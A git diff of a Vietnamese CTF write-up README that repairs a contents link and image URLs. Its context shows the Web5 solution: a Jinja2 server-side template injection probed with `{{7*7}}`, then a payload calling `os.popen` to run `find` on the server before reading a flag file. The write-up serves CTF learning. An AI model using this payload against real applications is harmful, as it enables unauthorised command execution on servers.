@@ -10,7 +10,7 @@
 - [Web13](https://github.com/DucThinh47/VibloCTF-Writeups#web13)
 - [Web6](https://github.com/DucThinh47/VibloCTF-Writeups#web6)
 - [phpinfo.php](https://github.com/DucThinh47/VibloCTF-Writeups#phpinfophp)
-- [Web5]()
+- [Web5](https://github.com/DucThinh47/VibloCTF-Writeups#web5)
 #### Web7
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image0.png?raw=true)
@@ -385,21 +385,21 @@ Tiến hành đọc file này và tìm được flag:
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image43.png?raw=true)
 #### Web5
 
-![img](44)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image44.png?raw=true)
 
 Sau khi thử một loạt các cách khai thác thì tôi tìm được trang web bị dính lỗ hổng SSTI, sử dụng template Jinja2, cụ thể khi tôi chèn payload `{{7*7}}` vào URL thì website trả về như sau:
 
-![img](45)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image45.png?raw=true)
 
 Tiếp theo tôi chèn payload:
 
     {{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name *.txt').read() }}
 
-![img](46)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image46.png?raw=true)
 
 Tìm được file là `/src/_uh_oh_what_is_this_file.txt`, thử đọc nội dung file này và tìm được flag:
 
-![img](47)
+![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image47.png?raw=true)
 
 
 
